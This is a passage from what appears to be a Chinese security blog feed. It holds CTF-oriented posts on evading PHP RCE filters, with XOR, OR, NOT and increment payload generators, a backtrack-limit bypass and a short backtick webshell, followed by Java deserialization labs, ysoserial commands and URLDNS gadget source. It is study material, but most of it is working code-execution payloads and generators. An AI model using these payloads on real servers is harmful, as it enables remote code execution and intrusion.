class="keyword">for</span> i in arg:</span><br><span class="line">       f=<span class="title function_ invoke__">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> True:</span><br><span class="line">           t=f.<span class="title function_ invoke__">readline</span>()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.<span class="title function_ invoke__">close</span>()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">   param=<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="keyword">print</span>(param)</span><br></pre></td></tr></table></figure>

<p>php运行后生成一个txt文档，包含所有可见字符的异或构造结果。<br>接着运行python脚本即可。<br>题目比如[<a href="https://xiaolong22333.top/index.php/archives/38/#suctf2019easyweb">SUCTF 2019]EasyWeb</a></p>
<h3 id="或"><a href="#或" class="headerlink" title="或"></a>或</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_i</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$hex_j</span>=<span class="title function_ invoke__">dechex</span>(<span class="variable">$j</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//根据题目给的正则表达式修改即可</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_i</span>))||<span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span> , <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">        <span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">        <span class="variable">$c</span>=(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>)|<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">            <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line"><span class="keyword">from</span> sys import *</span><br><span class="line">import os</span><br><span class="line">def <span class="title function_ invoke__">action</span>(arg):</span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i in arg:</span><br><span class="line">       f=<span class="title function_ invoke__">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> True:</span><br><span class="line">           t=f.<span class="title function_ invoke__">readline</span>()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.<span class="title function_ invoke__">close</span>()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">   param=<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>) )+<span class="title function_ invoke__">action</span>(<span class="title function_ invoke__">input</span>(<span class="string">&quot;[+] your command：&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="keyword">print</span>(param)</span><br></pre></td></tr></table></figure>

<p>跟异或差不多，过滤了<code>^</code>没过滤<code>|</code>的话就可以考虑用或</p>
<h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//在命令行中运行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">one</span>(<span class="params">s</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> s:</span><br><span class="line">        ss += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="number">255</span> - <span class="built_in">ord</span>(each)))[<span class="number">2</span>:].upper()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;[~<span class="subst">&#123;ss&#125;</span>][!%FF](&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">组成类似于system(pos(next(getallheaders())));即可</span></span><br><span class="line"><span class="string">a=whoami</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    a = <span class="built_in">input</span>(<span class="string">&quot;:&gt;&quot;</span>).strip(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">    aa = a.split(<span class="string">&quot;(&quot;</span>)</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> aa[:-<span class="number">1</span>]:</span><br><span class="line">        s += one(each)</span><br><span class="line">    s += <span class="string">&quot;)&quot;</span> * (<span class="built_in">len</span>(aa) - <span class="number">1</span>) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目有<a href="%5Bhttps://xiaolong22333.top/index.php/archives/38/#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019rceme%5D(https://xiaolong22333.top/index.php/archives/38/#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019rceme)">[极客大挑战 2019]RCE ME</a></p>
<h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//测试发现7.0.12以上版本不可使用</span></span><br><span class="line"><span class="comment">//使用时需要url编码下</span></span><br><span class="line"><span class="variable">$_</span>=[];<span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>;<span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>];<span class="variable">$___</span>=<span class="variable">$_</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$___</span>.=<span class="variable">$__</span>;<span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$_</span>;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>=<span class="variable">$$____</span>;<span class="variable">$___</span>(<span class="variable">$_</span>[_]);</span><br><span class="line">固定格式 构造出来的 <span class="title function_ invoke__">assert</span>(<span class="variable">$_POST</span>[_]);</span><br><span class="line">然后post传入   _=<span class="title function_ invoke__">phpinfo</span>();这我也不知道咋构造出来的，记一下就好</span><br></pre></td></tr></table></figure>

<h3 id="上传临时文件"><a href="#上传临时文件" class="headerlink" title="上传临时文件"></a>上传临时文件</h3><p>原理又来自于<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">p神文章</a></p>
<p>操作见<a href="https://xiaolong22333.top/index.php/archives/17/">ctfshow web入门55,56</a></p>
<h3 id="回溯法"><a href="#回溯法" class="headerlink" title="回溯法"></a>回溯法</h3><p>如果是post传参的话还可以回溯绕过，回溯次数上限一般是默认的100万次，所以填充100万个垃圾字符即可绕过，详情可以看p神的讲解<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a><br>题目比如[<a href="https://xiaolong22333.top/index.php/archives/38/#fbctf2019rceservice">FBCTF2019]RCEService</a></p>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还有一些最常见的，如<code>%0a(换行)</code>,<code>%5c(反斜杠)</code>,数组绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">%<span class="number">8</span>f%<span class="number">97</span>%<span class="number">8</span>f%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>^%ff%ff%ff%ff%ff%ff%ff    <span class="comment">#phpinfo</span></span><br><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure>

<p>之前遇到过一个看起来很怪的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=assert&amp;__=执行的命令</span><br></pre></td></tr></table></figure>

<p>这其实就是异或</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`&#123;&#123;&#123;<span class="string">&quot;^&quot;</span>?&lt;&gt;/</span><br><span class="line">这一串的异或结果为_GET</span><br></pre></td></tr></table></figure>

<p>然后<code>_</code>和<code>__</code>为变量名，所以本质上相当于这样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[_](<span class="variable">$_GET</span>[__]);</span><br></pre></td></tr></table></figure>

<p>利用的是php中字符串加上括号可被当作函数执行的特性，最后传参变成</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(执行的命令)；</span><br></pre></td></tr></table></figure>

<h2 id="最短一句话木马绕过检测"><a href="#最短一句话木马绕过检测" class="headerlink" title="最短一句话木马绕过检测"></a>最短一句话木马绕过检测</h2><blockquote>
<p>if(preg_match(“&#x2F;‘| |_|php|;|~|\^|\+|eval|{|}&#x2F;i”,$input)){</p>
</blockquote>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">&lt;<span class="string">?=</span><span class="string">`ls\t/*`</span><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>\t绕过空格检测，反引号实现命令执行，短标签绕过php检测</p>
]]></content>
      <categories>
        <category>daily</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化靶场学习</title>
    <url>/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>不能光看理论，学习一下如何攻击，后面再找比赛题目复现</p>
<span id="more"></span>

<h1 id="javaDeserializeLabs"><a href="#javaDeserializeLabs" class="headerlink" title="javaDeserializeLabs"></a>javaDeserializeLabs</h1><h2 id="lab1-basic"><a href="#lab1-basic" class="headerlink" title="lab1-basic"></a>lab1-basic</h2><p> 可以看到在basic接口处触发反序列化，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20241130233800675.png"><img src="/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20241130233800675.png" alt="image-20241130233800675"></a></p>
<blockquote>
<p>不许有人不知道<a href="https://github.com/jar-analyzer/jar-analyzer/commits?author=4ra1n">@4ra1n</a>大佬的</p>
<p><a href="https://github.com/jar-analyzer/jar-analyzer">https://github.com/jar-analyzer/jar-analyzer</a></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20241202003424871.png"><img src="/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20241202003424871.png" alt="image-20241202003424871"></a></p>
<p>lab1直接给了我们现成Calc类，所以直接序列化用就行，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20241202233105486.png"><img src="/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/image-20241202233105486.png" alt="image-20241202233105486"></a></p>
]]></content>
      <categories>
        <category>Java漫谈学习</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全[反序列化(2)]</title>
    <url>/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)%5D/</url>
    <content><![CDATA[<p>上一篇反序列化文章主要分析<code>wirteObject</code>和<code>readObject</code>这两个方法，</p>
<p>知道了序列化和反序列化的过程，漏洞形成的原因主要就是因为服务端进行反序列化数据时，会自动调用类中的<code>readObject</code>代码，这样就使得攻击者可以在服务器上执行一些恶意代码。</p>
<blockquote>
<p>大致有四种情况会导致反序列化形成，</p>
<ul>
<li>入口类(主类)重写<code>readObject</code>方法，直接调用危险函数</li>
<li>入口类的参数中包含可控类，该类中存在危险函数，<code>readObject</code>时调用</li>
<li>入口类参数中包含可控类，该类调用其他有危险方法的类，<code>readObject</code>时进行调用</li>
<li>构造函数&#x2F;静态代码块等类加载时隐式执行</li>
</ul>
</blockquote>
<p>而入口类必须调用<code>Serializable</code>接口，不然该类无法被实例化，并且重写了<code>readObject</code>，可以构造利用链。</p>
<p>这篇讲述<code>URLDNS</code>，一步步学习，再学习cc链。</p>
<span id="more"></span>

<h1 id="Java安全-反序列化-1"><a href="#Java安全-反序列化-1" class="headerlink" title="Java安全[反序列化(1)]"></a>Java安全[反序列化(1)]</h1><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><p>开篇先提及一个构造cc链最常见的工具ysoserial，关攻击者可以根据自身生成不同的利用链(Gadget Chain)，工具将链子进行反序列化，最后攻击者发送到目标服务器，从而引导服务器执行一些指令。</p>
<p>使用方法简单，如下是生成一个<code>cc1</code>的链子，执行命令为<code>id</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ./ysoserial-all.jar CommonsCollections1 <span class="string">&quot;id&quot;</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)%5D/image-20240105140302168.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/image-20240105140302168.png" alt="image-20240105140302168"></a></p>
<p>但是因为反序列化中会存在一些无法正常的显示的字符，所以一般会进行编码输出，</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar ./ysoserial-all.jar CommonsCollections1 <span class="string">&quot;id&quot;</span> | <span class="built_in">base64</span> &gt; 1.txt</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)%5D/image-20240105140517650.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/image-20240105140517650.png" alt="image-20240105140517650"></a></p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)%5D/image-20240105140602101.png"><img src="/Java%E5%AE%89%E5%85%A8[%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)]/image-20240105140602101.png" alt="image-20240105140602101"></a></p>
<h2 id="URL-DNS"><a href="#URL-DNS" class="headerlink" title="URL DNS"></a>URL DNS</h2><p><code>urldns</code>是一个测试反序列化漏洞的链子，其本身并不会执行命令，而是通过让目标服务器发送一次dns请求。虽然不能执行命令，但是在测试漏洞存在性有两个比较好的优势。</p>
<ul>
<li>使用Java内置类，不需要调用第三方的库。</li>
<li>不需要服务器回显，直接通过dns请求情况来确定漏洞的存在。</li>
</ul>
<p>查看URLDNS链生成代码，</p>
<p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p>
<p>注释解释很详细，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//在payload创建期间避免DNS解析</span></span><br><span class="line">                <span class="comment">//由于字段 java.net.URL.handler 是临时的，因此它不会成为序列化payload的一部分。</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap会包含URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL作为键</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//值可以是可序列化的任何内容，URL作为键是触发DNS查找的内容。</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// 在上面的放置过程中，计算并缓存URL的hashCode。这将对其进行重置，以便下一次调用hashCode时将触发DNS查找。</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 这个URLStreamHandler实例用于在创建URL实例时避免任何DNS解析</span></span><br><span class="line"><span class="comment">         * DNS解析用于漏洞检测。重要的是不要预先探测给定的URL使用序列化对象</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;潜在失败的风险:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * 如果首先从测试计算机解析该DNS名称，则目标服务器可能会在第二次解析时才发送请求。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span 